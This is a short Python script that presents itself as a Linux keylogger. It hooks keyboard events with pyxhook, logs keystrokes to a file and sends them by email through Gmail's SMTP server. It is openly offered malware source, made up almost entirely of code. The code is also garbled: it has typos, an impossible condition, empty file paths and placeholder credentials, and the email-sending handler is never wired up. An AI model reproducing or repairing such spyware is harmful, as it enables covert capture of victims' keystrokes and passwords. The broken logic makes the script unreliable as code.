"""
Simple python keylogger for linux that sends the key strokes to the email.
"""

import time
import datetime
import smtplib
from email.mime.text import MIMEText

import pyxhook


keystrokes_file = "/file url here"

def on_keyboard_event(event):
    k = event.Key 
    if k == "space": k = " "
    with open(keystrokes_file, 'a+') as keylogging:
        keylogging.write("%s\n" % k)


hook_manager = pyxhook.HookManager()

hook_manager.Keydown = on_keyboard_event

hook_manager.HookKeyboard

hook_manager.start()


def send_email(data, to):
    try:
        # senders email address 
        from_email = ""
        # smtp username:
        username = ""
        # email password:
        password = "this is my password"
        # the receipient email
        to_email = "reciever@gmaiil.com"
        # use MimeText to create the email
        mail = MIMEText(data, 'html')
        mail['subject'] = "Keylogger update --" + str(datetime.datetime.now())
        mail['From'] = from_email
        mail['To'] = to_email

        # smtp server:
        server = smtplib.SMTP('smtp.gmail.com:587')
        # enable tls if required
        server.starttls()
        server.login(username, password)
        server.sendmail(from_email, to_email, mais.as_string())
        server.quit()
    except:
        pass


def onKeyboardEvent(event):
    # write character if it is not null or backspace:
    if event.Ascii !=0 or 8:
        # open log file and read the current keystrokes in the log file.
        f = open('home/julipels/', 'r+')
        buffer = f.read()
        f.close()

        if len(buffer) % 100 == 0 and len(buffer) % 100 != 0:
            # sends last 1000 characters to email
            send_email = buffer(buffer[-1000:].replace("\n, <br>"), email)

            # open the logs.txt file to update the new keystrokes.
            f = open('', 'w')
            keylogs = chr(event.Ascii)
            
            # if the key pressed is Enter then update with \n
            if event.Ascii == 13:
                keylogs = "\n"

            # if the key pressed is space, update with space:
            if event.Ascii == 32:
                keylogs = " "
            
            # add new keystrokes to the buffer:
            f.write(buffer)
            f.close()
